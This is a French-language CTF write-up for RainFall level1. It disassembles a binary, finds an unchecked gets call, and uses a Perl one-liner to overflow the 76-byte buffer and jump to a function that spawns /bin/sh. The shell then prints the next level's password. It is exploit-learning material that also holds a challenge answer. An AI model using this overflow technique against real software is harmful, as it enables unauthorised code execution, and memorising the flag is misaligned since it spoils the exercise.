Comme precedemment, je vais desassembler le programme pour voir ce qu'il fait.

```bash
level1@RainFall:~$ objdump -d ./level1
(...)
08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave
(...)
```

Je vois que la fonction main appelle `gets` pour lire une chaine de caracteres et rien d'autre,  
alors qu'un peu plus haut je vois la fonction `run` qui appelle `system` avec `/bin/sh` en argument.

Je me mets donc a chercher un moyen d'appeler `run` en passant par `main`. Et effectivement, `gets` est une fonction qui peut etre exploitee pour faire du buffer overflow.
La fonction `gets` qui ne verifie pas la taille du buffer, qui ici a une taille de 76.
Et du coup je peux ecrire une addresse differente juste apres le buffer pour ecraser l'adresse de retour de `main` et la faire pointer sur `run`.

[Source buffer overflow en C](https://owasp.org/www-community/attacks/Buffer_overflow_attack)

```bash
level1@RainFall:~$ perl -e 'print "A"x76 . "\x44\x84\x04\x08"' > /tmp/pl1
level1@RainFall:~$ cat /tmp/pl1 - | ./level1

Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```

A noter que `\x44\x84\x04\x08` est l'adresse de `run` en little endian. (globalement l'addresse est a l'envers dans la memoire)